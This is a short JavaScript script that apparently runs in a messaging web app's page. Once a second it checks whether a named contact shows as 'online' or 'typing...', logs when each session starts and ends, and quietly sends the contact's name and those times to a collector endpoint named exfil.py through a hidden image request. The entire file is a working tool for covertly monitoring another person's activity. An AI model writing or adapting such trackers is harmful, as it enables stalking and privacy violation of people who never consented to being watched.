var online = document.getElementsByClassName("_315-i");
var user = document.getElementsByClassName("_19RFN");
var startTime = "DUMMY";
var endTime = "DUMMY";

function trackuser() {
	var track = 1;
	if (track) {
		setTimeout(function(){
			var today = new Date();
			var date = today.getFullYear()+'/'+(today.getMonth()+1)+'/'+today.getDate();
			var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
			var encodedDate = encodeURIComponent(date);
			var encodedTime = encodeURIComponent(time);
			try {
				if (online[0].innerText == "online" || online[0].innerText == "typing...") {
					if (startTime == "DUMMY") {
						startTime = encodedTime;
					}
					endTime = encodedTime;
					console.log("User online! (" + user[0].innerText + ")");
				} else {
					if (startTime != "DUMMY") {
						var encodedUser = encodeURIComponent(user[0].innerText);
						var exfilImage = new Image();
						exfilImage.src = "http://127.0.0.1/cgi-bin/exfil.py?user=" + encodedUser + "&date=" + encodedDate  +  "&starttime=" + startTime + "&endtime=" + endTime;

						startTime = "DUMMY";
						endTime = "DUMMY";
					} else {
						console.log("User not online. Last online: " + online[0].innerText + " (Not sending)");
					}
				}
			} catch(error) {
				console.error("User not online - Privacy mode activated (" + error + ")");
			}
			trackuser();
		}, 1000);
	}
}
trackuser()

